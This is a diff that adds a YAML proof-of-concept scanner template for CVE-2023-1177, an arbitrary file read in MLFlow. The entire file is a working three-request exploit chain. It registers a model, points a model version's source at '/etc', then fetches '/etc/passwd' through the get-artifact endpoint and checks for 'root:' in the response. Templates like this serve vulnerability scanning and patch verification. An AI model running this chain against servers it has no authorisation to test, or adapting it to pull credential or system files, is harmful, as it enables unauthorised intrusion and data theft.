@@ -1,0 +1,90 @@
+id: poc-yaml-mlflow-get-artifact-file-read
+info:
+  name: MLFlow get_artifact_file Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-1177
+
+variables:
+  r_key: "{{rand_base(8)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: create-registered-model
+    method: POST
+    path:
+      - "/ajax-api/2.0/mlflow/registered-models/create"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"name": "{{r_key}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "{{r_key}}"
+          - "\"registered_model\":"
+          - "\"name\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: create-model-version
+    method: POST
+    path:
+      - "/ajax-api/2.0/mlflow/model-versions/create"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"name": "{{r_key}}", "source": "/etc"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "{{r_key}}"
+          - "\"model_version\":"
+          - "\"name\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: get-artifact
+    method: GET
+    path:
+      - "/model-versions/get-artifact?path=passwd&name={{r_key}}&version=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
